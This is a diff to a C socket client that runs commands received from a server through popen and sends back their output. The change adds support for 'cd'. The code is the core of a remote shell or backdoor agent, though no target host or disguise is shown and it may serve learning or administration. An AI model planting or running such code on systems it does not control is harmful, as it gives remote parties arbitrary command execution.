@@ -20,24 +20,37 @@ void error(const char *msg) {
 
 // Function to execute a command and send the output to the server
 void execute_command(int sock, const char *command) {
-  // If command is invalid or empty, notify the client
   if (!command || strlen(command) == 0) {
     send(sock, "Invalid command\n", 16, 0);
     return;
   }
-  // Open a pipe to execute the command
+
+  // Check if the command is "cd"
+  if (strncmp(command, "cd ", 3) == 0) {
+    const char *path = command + 3; // Skip "cd "
+    if (chdir(path) == -1) {
+      perror("chdir failed");
+      send(sock, "cd: No such file or directory\n", 30, 0);
+    } else {
+      send(sock, "Directory changed\n", 18, 0);
+    }
+    send(sock, END_MARKER, strlen(END_MARKER), 0);
+    return;
+  }
+
+  // For other commands, use popen as before
   FILE *fp = popen(command, "r");
   if (!fp) {
     send(sock, "Command failed\n", 15, 0);
+    send(sock, END_MARKER, strlen(END_MARKER), 0);
     return;
   }
 
   char buffer[BUFFER_SIZE];
   size_t bytes_read;
 
-  // Read the command output and send it to the server
   while ((bytes_read = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
-    buffer[bytes_read] = '\0'; // Ensure null-terminated string
+    buffer[bytes_read] = '\0';
     if (send(sock, buffer, bytes_read, 0) < 0) {
       perror("send failed");
       break;
@@ -45,11 +58,8 @@ void execute_command(int sock, const char *command) {
   }
 
   pclose(fp);
-
-  // Send an end marker after the command output
   send(sock, END_MARKER, strlen(END_MARKER), 0);
 }
-
 int main() {
   int sock;
   struct sockaddr_in serv_addr;
